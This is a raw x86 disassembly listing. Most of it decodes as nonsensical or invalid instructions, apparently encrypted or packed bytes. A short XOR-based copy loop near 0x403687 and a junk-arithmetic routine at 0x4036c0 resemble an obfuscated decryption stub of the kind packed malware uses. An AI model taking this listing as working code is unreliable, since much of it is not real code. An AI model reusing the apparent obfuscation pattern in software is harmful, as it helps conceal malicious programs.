  403163:	sti    
  403164:	mov    edi,0x474c872a
  403169:	cwde   
  40316a:	jmp    0x9c3a1a5a
  40316f:	idiv   DWORD PTR [ebx+0x28]
  403172:	add    cl,ah
  403174:	inc    eax
  403175:	push   ecx
  403176:	mov    DWORD PTR [esi+0x451ded69],ebp
  40317c:	xchg   ebx,eax
  40317d:	push   esp
  40317e:	mov    cl,0x65
  403180:	cmp    DWORD PTR [ebx+0xcffd256],ebp
  403186:	mov    dh,0x90
  403188:	repz ror bl,cl
  40318b:	cmp    BYTE PTR [edi-0x8a087a1],ch
  403191:	or     cl,al
  403193:	mov    eax,0x71ca9379
  403198:	or     esi,esi
  40319a:	cmp    esp,ecx
  40319c:	sbb    edi,DWORD PTR [eax]
  40319e:	xor    BYTE PTR [eax],dl
  4031a0:	jne    0x4031be
  4031a2:	nop
  4031a3:	sub    dl,BYTE PTR [esi+edx*1-0x56]
  4031a7:	jo     0x4031af
  4031a9:	repz call 0xff5d:0xed86b205
  4031b1:	and    eax,DWORD PTR [esi]
  4031b3:	sbb    al,0xc1
  4031b5:	imul   BYTE PTR [eax]
  4031b7:	dec    edx
  4031b8:	ficomp WORD PTR [ecx+eax*8]
  4031bb:	js     0x40314e
  4031bd:	push   esp
  4031be:	jmp    FWORD PTR [ebp-0x5b7a7586]
  4031c4:	jg     0x403218
  4031c6:	and    DWORD PTR [ebx-0x2e],edx
  4031c9:	int    0xc
  4031cb:	mov    DWORD PTR [esi+0x6265d984],esp
  4031d1:	push   0x48f2ca0e
  4031d6:	pop    ebx
  4031d7:	nop
  4031d8:	adc    eax,0xa2e5489e
  4031dd:	icebp  
  4031de:	add    DWORD PTR [edi+0xa],ebp
  4031e1:	shl    DWORD PTR [edx-0x1d],cl
  4031e4:	pop    ebx
  4031e5:	in     eax,0x2c
  4031e7:	pop    esi
  4031e8:	test   dh,bh
  4031ea:	cmp    dl,BYTE PTR [ebp-0x6d]
  4031ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031ee:	aas    
  4031ef:	xor    al,0xa5
  4031f1:	mov    fs,WORD PTR [edi-0x69]
  4031f4:	push   edi
  4031f5:	test   BYTE PTR [esi+0x0],dh
  4031f8:	dec    edi
  4031f9:	add    ah,BYTE PTR [edi+0x2a3d3123]
  4031ff:	fld    QWORD PTR [ebx+0x61]
  403202:	jnp    0x4031b1
  403204:	sbb    BYTE PTR cs:[ecx+0x64758aef],ah
  40320b:	and    esi,DWORD PTR [edi]
  40320d:	(bad)  
  40320f:	iret   
  403210:	cld    
  403211:	fsubr  st,st(5)
  403213:	xor    ch,dh
  403215:	fdiv   QWORD PTR [edi+edx*2]
  403218:	leave  
  403219:	or     edi,DWORD PTR [eax-0x74]
  40321c:	jns    0x403203
  40321e:	out    0xfd,ax
  403221:	loopne 0x40328f
  403223:	imul   ebx,DWORD PTR [ebx-0x4c],0xe
  403227:	shl    ah,1
  403229:	dec    eax
  40322a:	cmp    bh,dl
  40322c:	xor    al,0x75
  40322e:	ss das 
  403230:	(bad)  
  403231:	adc    esp,DWORD PTR [ebp+ebx*4+0x32ebb4fc]
  403238:	pop    ds
  403239:	pop    ecx
  40323a:	mov    ch,0x59
  40323c:	les    eax,FWORD PTR [ebx-0x59e41f19]
  403242:	xchg   DWORD PTR [eax+esi*8-0x870a13b],esp
  403249:	lock sar BYTE PTR [eax+0x6e76431a],1
  403250:	push   ds
  403251:	push   cs
  403252:	inc    BYTE PTR [ecx]
  403254:	les    esp,FWORD PTR [edx]
  403256:	daa    
  403257:	jmp    0x4032aa
  403259:	loope  0x403207
  40325b:	xchg   esp,eax
  40325c:	mov    ecx,ebp
  40325e:	inc    eax
  40325f:	bound  ebp,QWORD PTR [esi+0x2b6590ff]
  403265:	and    eax,0xd0033a90
  40326a:	sbb    ecx,DWORD PTR [ebp-0x72af97cf]
  403270:	lods   eax,DWORD PTR ds:[esi]
  403271:	or     ah,BYTE PTR [ebp-0x23]
  403274:	pushf  
  403275:	in     eax,dx
  403276:	ins    BYTE PTR es:[edi],dx
  403277:	jb     0x4032b6
  403279:	dec    DWORD PTR ds:0x71bc0f18
  40327f:	dec    esp
  403280:	mov    bh,0xde
  403282:	push   0x48
  403284:	dec    edx
  403285:	jo     0x4032a5
  403287:	mov    dh,0xc
  403289:	lds    ebp,FWORD PTR [esp+edi*4-0x252a736]
  403290:	in     eax,0xc2
  403292:	adc    eax,0xfdc87ceb
  403297:	bound  esp,QWORD PTR [edx-0x26]
  40329a:	sbb    BYTE PTR [eax+edx*8+0x78],ah
  40329e:	sub    BYTE PTR [edx],al
  4032a0:	add    edx,esi
  4032a2:	inc    ebx
  4032a3:	jno    0x4032da
  4032a5:	cli    
  4032a6:	stc    
  4032a7:	scas   eax,DWORD PTR es:[edi]
  4032a8:	mov    ah,0xfe
  4032aa:	(bad)  
  4032ab:	sbb    dh,BYTE PTR [edi]
  4032ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ae:	push   esp
  4032af:	inc    eax
  4032b0:	jp     0x4032af
  4032b2:	test   BYTE PTR [edi],0xe1
  4032b5:	leave  
  4032b6:	pop    esi
  4032b7:	popf   
  4032b8:	push   ebx
  4032b9:	mov    BYTE PTR [eax],0x86
  4032bc:	ret    0x9931
  4032bf:	push   0x9747bdd2
  4032c4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4032c6:	das    
  4032c7:	push   0xcbb55a78
  4032cc:	pop    ebp
  4032cd:	jbe    0x4032e3
  4032cf:	sub    bl,bh
  4032d1:	gs in  eax,0x3f
  4032d4:	push   ebp
  4032d5:	add    DWORD PTR [ecx+edx*2],esi
  4032d8:	repnz xor ah,BYTE PTR [edx-0x1778b5b6]
  4032df:	aaa    
  4032e0:	lea    edi,[esp+eiz*8-0x71b7ee27]
  4032e7:	fcomp  QWORD PTR [ecx+0x55]
  4032ea:	adc    eax,0x10f5bd5e
  4032ef:	mov    cl,0xa3
  4032f1:	sub    eax,0xad6b3178
  4032f7:	shl    DWORD PTR [eax-0x26],0x31
  4032fb:	or     eax,0x356f65ea
  403300:	and    DWORD PTR [esi+0x24],0xffffffe2
  403304:	imul   edi,edx,0x7dd2712a
  40330a:	test   eax,0x7931d284
  40330f:	inc    ecx
  403310:	pop    ebp
  403311:	sti    
  403312:	pop    ss
  403313:	jmp    0x74bcfd3
  403318:	ins    BYTE PTR es:[edi],dx
  403319:	test   BYTE PTR [edx-0x74],bl
  40331c:	mov    al,0xe8
  40331e:	ja     0x4032db
  403320:	add    BYTE PTR [edi+esi*4],cl
  403323:	jge    0x40338c
  403325:	ja     0x4032db
  403327:	dec    esp
  403328:	lock or bh,al
  40332b:	add    edi,DWORD PTR [ecx]
  40332d:	dec    ecx
  40332e:	lahf   
  40332f:	cld    
  403330:	pop    DWORD PTR [edi+0x5e]
  403333:	addr16 mov al,ds:0xa755
  403337:	fistp  DWORD PTR [esi+0x28]
  40333a:	leave  
  40333b:	nop
  40333c:	sahf   
  40333d:	cli    
  40333e:	add    ch,cl
  403340:	sub    DWORD PTR [ebx-0x376c1ab],ebp
  403346:	mov    DWORD PTR [esi-0x26],0x55392e99
  40334d:	inc    edx
  40334e:	cld    
  40334f:	xchg   DWORD PTR [ebx+0x2c9367c5],edx
  403355:	lods   al,BYTE PTR ds:[esi]
  403356:	out    dx,eax
  403357:	adc    ebx,DWORD PTR gs:[edi]
  40335a:	scas   al,BYTE PTR es:[edi]
  40335b:	cmp    bl,bh
  40335d:	rcl    BYTE PTR [edi+ebx*8-0x2cdab55a],cl
  403364:	pop    es
  403365:	jecxz  0x4033c2
  403367:	push   esp
  403368:	push   es
  403369:	clc    
  40336a:	fst    DWORD PTR [ebx+0x7a]
  40336d:	jecxz  0x40330d
  40336f:	push   ss
  403370:	out    dx,al
  403371:	jl     0x403378
  403373:	pusha  
  403374:	jbe    0x4033d5
  403376:	lock cs popa 
  403379:	popf   
  40337a:	inc    DWORD PTR [edx-0x5a6c396c]
  403380:	mov    al,0x5a
  403382:	mov    ch,bh
  403384:	dec    edi
  403385:	pop    DWORD PTR [edx+eax*2+0x6d382245]
  40338c:	cwde   
  40338d:	dec    esi
  40338e:	mov    ebx,0xfd31549d
  403393:	call   0x647c:0x534fff58
  40339a:	popf   
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	loopne 0x40337a
  4033bb:	(bad)  
  4033bc:	loopne 0x4033f8
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x40339e
  4033c6:	leave  
  4033c7:	adc    DWORD PTR [ebp-0x6910a4dd],ecx
  4033cd:	add    ah,cl
  4033cf:	ins    BYTE PTR es:[edi],dx
  4033d0:	add    DWORD PTR [edi],ecx
  4033d2:	mov    bh,0x4a
  4033d4:	aas    
  4033d5:	and    BYTE PTR [ecx-0x4b3b85bf],bl
  4033db:	cmp    ah,ah
  4033dd:	push   ebx
  4033de:	les    edi,FWORD PTR [edx+0x3a47e947]
  4033e4:	cld    
  4033e5:	data16 out 0xd3,al
  4033e8:	fs aaa 
  4033ea:	arpl   sp,sp
  4033ec:	fstp   DWORD PTR [esp+ecx*2]
  4033ef:	xchg   BYTE PTR [ecx+esi*8],ah
  4033f2:	sub    BYTE PTR [eax+0x10c64ab4],ch
  4033f8:	xchg   BYTE PTR [eax+edi*8],ch
  4033fb:	or     ebp,DWORD PTR [eax-0x19]
  4033fe:	cmp    DWORD PTR [ebp+0x78027243],esp
  403404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403405:	lods   al,BYTE PTR ds:[esi]
  403406:	adc    eax,0xb56f0718
  40340b:	(bad)  
  40340c:	jnp    0x4033de
  40340e:	ss mov edx,0xa9275306
  403414:	push   ss
  403415:	mov    dl,0x29
  403417:	shl    edi,0x6b
  40341a:	sub    al,0x46
  40341c:	shl    DWORD PTR [eax+ebp*8+0x3d],cl
  403420:	or     DWORD PTR [ebp+0x520233a5],edx
  403426:	pop    edx
  403427:	mul    DWORD PTR [ebx+0x38e8400a]
  40342d:	mov    WORD PTR [edi],ds
  40342f:	les    esi,FWORD PTR [ebx+ebx*1]
  403432:	mov    bh,0x30
  403434:	sbb    dh,BYTE PTR [ecx+edi*2]
  403437:	xor    BYTE PTR [ebp+0x26],dl
  40343a:	pop    ebp
  40343b:	sbb    edi,edx
  40343d:	fstp   DWORD PTR [esp+edx*1+0x3f478d2]
  403444:	xchg   BYTE PTR [ecx+0x3033b4c6],bl
  40344a:	lods   eax,DWORD PTR ds:[esi]
  40344b:	sbb    ebx,esp
  40344d:	cmp    BYTE PTR [edi-0x3e63fa08],0x79
  403454:	repz call FWORD PTR [esi]
  403457:	lahf   
  403458:	cmp    eax,0x94301308
  40345d:	pop    ss
  40345e:	pop    eax
  40345f:	push   edx
  403460:	pop    edi
  403461:	gs sub cl,dl
  403464:	rcl    BYTE PTR [eax-0x7fed090a],cl
  40346a:	rcr    DWORD PTR [esi+eiz*8-0x33],cl
  40346e:	shl    eax,cl
  403470:	test   eax,0xaa8f60da
  403475:	xchg   ebp,eax
  403476:	rcl    BYTE PTR [edi+ebp*8-0x54],0x77
  40347b:	outs   dx,DWORD PTR ds:[esi]
  40347c:	sbb    DWORD PTR [ecx-0x3cc7005e],esp
  403482:	xchg   edx,eax
  403483:	push   ecx
  403484:	test   DWORD PTR [esi-0x4cc5274a],edi
  40348a:	loopne 0x403445
  40348c:	adc    bh,BYTE PTR [edi-0x528f4340]
  403492:	fidiv  DWORD PTR [edi+0x4a4077d7]
  403498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403499:	gs inc esi
  40349b:	outs   dx,DWORD PTR ds:[esi]
  40349c:	xor    edx,0xff129d22
  4034a2:	push   0xffffffff
  4034a4:	pop    eax
  4034a5:	pop    ss
  4034a6:	xor    eax,0xb150c2fe
  4034ab:	aam    0x4f
  4034ad:	ins    DWORD PTR es:[edi],dx
  4034ae:	pop    ds
  4034af:	sahf   
  4034b0:	fsub   DWORD PTR [edx]
  4034b2:	in     eax,dx
  4034b3:	dec    edx
  4034b4:	das    
  4034b5:	mov    bl,0x99
  4034b7:	pop    edi
  4034b8:	mov    esi,0x950a4743
  4034bd:	in     eax,dx
  4034be:	test   DWORD PTR [esi],ecx
  4034c0:	xor    ch,bl
  4034c2:	ficomp DWORD PTR [ebx]
  4034c4:	cmp    al,BYTE PTR [ebp-0x31]
  4034c7:	ficom  DWORD PTR [ecx-0xa]
  4034ca:	outs   dx,BYTE PTR ds:[esi]
  4034cb:	repz dec ebp
  4034cd:	fs jge 0x4034e3
  4034d0:	jns    0x403500
  4034d2:	mov    ebp,0xcca8ba66
  4034d7:	cli    
  4034d8:	add    al,0x8d
  4034da:	pop    ss
  4034db:	pop    edi
  4034dc:	jb     0x4034c9
  4034de:	arpl   bp,dx
  4034e0:	enter  0x4a7c,0xc9
  4034e4:	dec    ebp
  4034e5:	pop    ds
  4034e6:	fs or  al,cl
  4034e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034ea:	jno    0x403546
  4034ec:	or     DWORD PTR [ebx-0x65],ebx
  4034ef:	and    cl,BYTE PTR [ecx]
  4034f1:	sti    
  4034f2:	xchg   DWORD PTR [edi+0x2afd2912],ebp
  4034f8:	mov    al,ds:0x18e6c18e
  4034fd:	xor    DWORD PTR [eax+0x3e],ebp
  403500:	or     al,0x22
  403502:	lods   eax,DWORD PTR ds:[esi]
  403503:	jns    0x403550
  403505:	popf   
  403506:	adc    ecx,DWORD PTR [edi-0x309de011]
  40350c:	xchg   esi,eax
  40350d:	inc    edx
  40350e:	or     BYTE PTR [edi],0x56
  403511:	jecxz  0x40349f
  403513:	sub    al,0xe0
  403515:	inc    eax
  403516:	dec    edx
  403517:	adc    ebp,edx
  403519:	(bad)  [edx+eax*8]
  40351c:	add    DWORD PTR [edi],eax
  40351e:	jae    0x4034c7
  403520:	out    0x29,eax
  403522:	jp     0x403555
  403524:	xor    dl,BYTE PTR [eax]
  403526:	mov    cl,BYTE PTR [esp+esi*8]
  403529:	int3   
  40352a:	push   ds
  40352b:	xchg   ecx,eax
  40352c:	add    ah,BYTE PTR [eax+0x3a]
  40352f:	lea    ebx,[esi+ebp*1]
  403532:	sbb    ah,BYTE PTR [eax+0xa160aeb]
  403538:	mov    BYTE PTR [ebp-0x26],al
  40353b:	sbb    al,0x79
  40353d:	pushaw 
  40353f:	fisub  WORD PTR [edx]
  403541:	push   ebx
  403542:	xlat   BYTE PTR ds:[ebx]
  403543:	fild   WORD PTR [ebp-0x3d1e9c90]
  403549:	(bad)  
  40354b:	inc    edx
  40354c:	mov    bh,0x12
  40354e:	adc    DWORD PTR [ebp+0x37bf06dc],esp
  403554:	dec    edx
  403555:	fsubp  st(0),st
  403557:	fist   WORD PTR [edx-0x32]
  40355a:	pavgw  mm6,QWORD PTR [edi+eax*1]
  40355e:	test   eax,0xe6adfe7c
  403563:	push   ebx
  403564:	sar    eax,cl
  403566:	xlat   BYTE PTR ds:[ebx]
  403567:	sbb    eax,0xa92ff15d
  40356c:	cs jg  0x40356f
  40356f:	push   ebx
  403571:	loopne 0x40357f
  403573:	lahf   
  403574:	sub    ebx,esp
  403576:	sbb    BYTE PTR [ecx+ebp*2],cl
  403579:	mov    dl,0x70
  40357b:	out    dx,al
  40357c:	loopne 0x40358d
  40357e:	push   cs
  40357f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403580:	cmp    DWORD PTR [esi+0x16],ebp
  403583:	pop    eax
  403584:	sbb    dh,0x6f
  403587:	mov    cl,0x96
  403589:	mov    bh,0x2a
  40358b:	push   0xc90d018d
  403590:	sti    
  403591:	cdq    
  403592:	pop    edx
  403593:	outs   dx,BYTE PTR ds:[esi]
  403594:	xchg   ebx,eax
  403595:	cdq    
  403596:	xor    BYTE PTR gs:[ebp-0x143fd2f2],bl
  40359d:	xchg   BYTE PTR [ecx],dh
  40359f:	push   0x481d688d
  4035a4:	lods   al,BYTE PTR ds:[esi]
  4035a5:	(bad)  
  4035a7:	and    esp,DWORD PTR [edx+0x15e4370]
  4035ad:	fnstsw WORD PTR [edi+0x405ec6f]
  4035b3:	pusha  
  4035b4:	cld    
  4035b5:	pop    ecx
  4035b6:	stc    
  4035b7:	sbb    eax,0xeae55abd
  4035bc:	dec    edx
  4035bd:	cwde   
  4035be:	loop   0x4035d0
  4035c0:	push   0xffffff9d
  4035c2:	in     eax,0x56
  4035c4:	pop    ebx
  4035c5:	or     BYTE PTR [esi],al
  4035c7:	jge    0x403551
  4035c9:	jl     0x403590
  4035cb:	in     al,0x58
  4035cd:	mov    bl,0x43
  4035cf:	xchg   esp,eax
  4035d0:	ins    DWORD PTR es:[edi],dx
  4035d1:	jmp    DWORD PTR [esi-0x776069a3]
  4035d7:	adc    eax,0x815b3ac
  4035dc:	sub    DWORD PTR [esi+eiz*8+0x3b],ebx
  4035e0:	jge    0x403644
  4035e2:	add    esp,ebp
  4035e4:	sbb    edi,DWORD PTR ss:[eax+0x66c1b3cf]
  4035eb:	jbe    0x403618
  4035ed:	dec    edi
  4035ee:	addr16 push 0x16ba9dd
  4035f4:	dec    eax
  4035f5:	jno    0x4035f3
  4035f7:	ss icebp 
  4035f9:	and    ch,BYTE PTR [edx+0x2d]
  4035fc:	add    ch,BYTE PTR [esi]
  4035fe:	test   BYTE PTR [ebp-0x12],0x91
  403602:	xor    BYTE PTR [ecx],al
  403604:	mov    al,BYTE PTR [ebx-0x55]
  403607:	pop    edx
  403608:	cld    
  403609:	or     DWORD PTR [edi-0x43],0xe5d6c219
  403610:	pop    esi
  403611:	and    BYTE PTR [ebx],bh
  403613:	loopne 0x403607
  403615:	dec    edx
  403616:	sbb    eax,0x6724e197
  40361b:	or     bl,BYTE PTR [esi+0x1036a4a5]
  403621:	cs or  al,0x46
  403624:	sub    edx,DWORD PTR [edi]
  403626:	fwait
  403627:	dec    edi
  403628:	pop    ecx
  403629:	xchg   edx,eax
  40362a:	xchg   edx,eax
  40362b:	(bad)  
  40362e:	sub    DWORD PTR [ecx-0x35],esp
  403631:	jl     0x4035e7
  403633:	arpl   WORD PTR [ecx+eiz*4],ax
  403636:	add    dh,cl
  403638:	cdq    
  403639:	inc    ebx
  40363a:	aam    0x4a
  40363c:	sub    BYTE PTR [edx+0x2b7a905e],ch
  403642:	test   ebp,ebp
  403644:	xor    DWORD PTR [ecx],esi
  403646:	call   0x574f129e
  40364b:	repnz pusha 
  40364d:	stos   BYTE PTR es:[edi],al
  40364e:	and    eax,0xc68d2e04
  403653:	fadd   DWORD PTR [esi]
  403655:	iret   
  403656:	pop    esp
  403657:	mov    dx,fs
  40365a:	in     al,dx
  40365b:	lock (bad) 
  40365d:	shl    BYTE PTR [edi+0x28f5aacb],cl
  403663:	xchg   ebx,eax
  403664:	xchg   ebx,eax
  403665:	and    eax,0xba4270b0
  40366a:	pop    ecx
  40366b:	xchg   cl,bl
  40366d:	add    al,0x7e
  40366f:	sbb    eax,DWORD PTR [ecx+0x32e2499d]
  403675:	loope  0x4036aa
  403677:	shl    BYTE PTR [edx],1
  403679:	jb     0x4036d2
  40367b:	mov    bh,0xd6
  40367d:	or     ch,BYTE PTR [edi]
  40367f:	out    dx,eax
  403680:	jae    0x403701
  403682:	mov    bh,0x3f
  403684:	(bad)  
  403685:	mov    dl,BYTE PTR [edx]
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    edi,edi
  4037a2:	adc    dh,bl
  4037a4:	xchg   esi,eax
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0x2e70707d
  4037ae:	nop
  4037af:	lods   eax,DWORD PTR ds:[esi]
  4037b0:	fidivr DWORD PTR [ebx+0x4d]
  4037b3:	inc    ecx
  4037b4:	add    dh,0x72
  4037b7:	xchg   edx,esp
  4037b9:	mov    eax,ds:0x57293bb4
  4037be:	cmp    al,0x24
  4037c0:	mov    BYTE PTR [ecx+edx*8],bh
  4037c3:	or     ebx,0x2dfef845
  4037c9:	dec    edi
  4037ca:	pop    eax
  4037cb:	aaa    
  4037cc:	ror    BYTE PTR [esi+0x1e9cb2ea],0x37
  4037d3:	cmp    eax,0xd24452a6
  4037d8:	repz jmp 0x403859
  4037db:	pop    edx
  4037dc:	fs sti 
  4037de:	test   al,0xb8
  4037e0:	ret    0x6d18
  4037e3:	(bad)  
  4037e4:	aam    0xee
  4037e6:	sub    eax,0x3215ec21
  4037eb:	outs   dx,BYTE PTR ds:[esi]
  4037ec:	in     al,0x86
  4037ee:	xchg   ebp,eax
  4037ef:	cmp    al,0x70
  4037f1:	cli    
  4037f2:	mov    ebx,0xd49a76bd
  4037f7:	cmp    esi,esi
  4037f9:	mov    bl,0xc9
  4037fb:	stos   DWORD PTR es:[edi],eax
  4037fc:	or     BYTE PTR [esi-0x5c],al
  4037ff:	xchg   DWORD PTR [esi-0x488d3150],edx
  403805:	ficom  DWORD PTR [edi]
  403807:	int3   
  403808:	stos   BYTE PTR es:[edi],al
  403809:	lahf   
  40380a:	fnstenv [ecx-0x48]
  40380d:	push   cs
  40380e:	mov    ch,0x64
  403810:	push   ds
  403811:	nop
  403812:	adc    BYTE PTR [edx+0x77de7670],bl
  403818:	ret    0x3f3e
  40381b:	push   edi
  40381c:	fcom   QWORD PTR [ebx+0x5b16f2e2]
  403822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403823:	bound  ebx,QWORD PTR [eax-0x121f2a26]
  403829:	or     DWORD PTR [ebx+0x19],ebp
  40382c:	mov    bl,0xdb
  40382e:	leave  
  40382f:	mov    cl,0x69
  403831:	(bad)  
  403832:	cmp    edx,esp
  403834:	xlat   BYTE PTR ds:[ebx]
  403835:	stos   DWORD PTR es:[edi],eax
  403836:	mov    bl,BYTE PTR [eax+eax*2]
  403839:	inc    eax
  40383a:	pop    edi
  40383b:	and    al,0xb0
  40383d:	cmp    ebp,DWORD PTR [eax]
  40383f:	ret    
  403840:	xchg   ecx,eax
  403841:	addr16 nop
  403843:	inc    ebp
  403844:	and    BYTE PTR [ecx+0x428402d3],ah
  40384a:	sub    al,0xcc
  40384c:	stos   DWORD PTR es:[edi],eax
  40384d:	pop    ds
  40384e:	les    esp,FWORD PTR [ebp-0x5c]
  403851:	out    0xb0,eax
  403853:	test   DWORD PTR [esi],esi
  403855:	jle    0x403879
  403857:	sub    eax,0x8631d15f
  40385c:	bound  ebp,QWORD PTR [esi]
  40385e:	jg     0x403885
  403860:	inc    ecx
  403861:	jae    0x4038a0
  403863:	loopne 0x40381e
  403865:	mov    ecx,0xfdd2526
  40386a:	sbb    eax,DWORD PTR [eax]
  40386c:	aaa    
  40386d:	inc    esi
  40386e:	imul   esi,edi,0xffffff82
  403871:	int3   
  403872:	mul    BYTE PTR [esi+edi*4+0x38445cd2]
  403879:	std    
  40387a:	enter  0xb697,0x5c
  40387e:	lods   eax,DWORD PTR ds:[esi]
  40387f:	out    dx,al
  403880:	scas   eax,DWORD PTR es:[edi]
  403881:	cdq    
  403882:	retf   0xb51f
  403885:	and    al,0xd6
  403887:	bound  edx,QWORD PTR [esi]
  403889:	xor    edx,DWORD PTR [edx+ecx*1+0xc3c41a0]
  403890:	outs   dx,DWORD PTR ds:[esi]
  403891:	inc    ebp
  403892:	das    
  403893:	out    0xf,al
  403895:	mov    ch,0xbd
  403897:	and    dh,bh
  403899:	(bad)  
  40389a:	mov    edx,0xe547b5fd
  40389f:	xchg   ecx,eax
  4038a0:	push   edx
  4038a1:	dec    eax
  4038a2:	loop   0x4038a4
  4038a4:	and    ah,bl
  4038a6:	and    DWORD PTR [ebx],0xfffffffa
  4038a9:	scas   al,BYTE PTR es:[edi]
  4038aa:	dec    eax
  4038ab:	mov    dh,0x5d
  4038ad:	das    
  4038ae:	in     al,dx
  4038af:	mov    ch,0x8c
  4038b1:	icebp  
  4038b2:	fbld   TBYTE PTR [edi-0x2e8b6bb3]
  4038b8:	add    esi,ecx
  4038ba:	xchg   BYTE PTR [ebp-0x3f0d71d5],cl
  4038c0:	pop    edx
  4038c1:	repnz sbb BYTE PTR [edx-0x79],bh
  4038c5:	mov    bl,0x39
  4038c7:	inc    ebp
  4038c8:	imul   eax,ebx,0xffffff87
  4038cb:	push   0x4e9d8a5b
  4038d0:	push   edx
  4038d1:	pop    ecx
  4038d2:	and    al,BYTE PTR [ecx-0x6d]
  4038d5:	(bad)  
  4038d6:	inc    ebp
  4038d7:	fcmovnb st,st(2)
  4038d9:	xor    edx,ecx
  4038db:	(bad)  
  4038dc:	jnp    0x403902
  4038de:	ss not edx
  4038e1:	adc    BYTE PTR [ecx+0x29],bl
  4038e4:	dec    edi
  4038e5:	scas   eax,DWORD PTR es:[edi]
  4038e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038e7:	into   
  4038e8:	push   eax
  4038e9:	cmp    eax,0x507e79bc
  4038ee:	push   di
  4038f0:	mov    ch,ah
  4038f2:	push   ebx
  4038f3:	add    DWORD PTR [ecx+0x1ad2e96],esp
  4038f9:	mov    cl,0xac
  4038fb:	mov    esp,DWORD PTR [edi]
  4038fd:	mov    bh,0x35
  4038ff:	shr    BYTE PTR [esi-0x45e6cd23],0xeb
  403906:	pop    es
  403907:	sar    ch,cl
  403909:	retf   
  40390a:	sti    
  40390b:	call   0x635eeb1
  403910:	lea    eax,ss:[esi+0x2b]
  403914:	in     al,dx
  403915:	push   esi
  403916:	fwait
  403917:	lods   al,BYTE PTR ds:[esi]
  403918:	out    0x9a,eax
  40391a:	(bad)  
  40391b:	rcl    eax,1
  40391d:	mov    ebx,0xf685a4f5
  403922:	jo     0x4038aa
  403924:	cs clc 
  403926:	(bad)  
  403927:	mov    eax,0xdd593b0f
  40392c:	sub    BYTE PTR [edi-0x3d70dd07],al
  403932:	xchg   edx,eax
  403933:	idiv   DWORD PTR [edx+0x1b128e3e]
  403939:	jb     0x403976
  40393b:	imul   edi,DWORD PTR [edx+0x35bad021],0x65a47704
  403945:	sar    dh,0x1e
  403948:	jne    0x40395c
  40394a:	mov    dh,0xe6
  40394c:	mov    ecx,0x6e453af7
  403951:	cld    
  403952:	jge    0x403904
  403954:	mov    ds:0x59545b83,al
  403959:	jmp    0xc568:0x74965764
  403960:	sub    cl,BYTE PTR [ebx]
  403962:	xor    BYTE PTR [esi],dh
  403964:	cdq    
  403965:	xor    al,0x18
  403967:	push   ds
  403968:	int    0x74
  40396a:	xor    edi,DWORD PTR [edi+ecx*4]
  40396d:	dec    ecx
  40396e:	(bad)  
  40396f:	(bad)  [ebx]
  403971:	or     DWORD PTR [edx],esp
  403973:	jp     0x403984
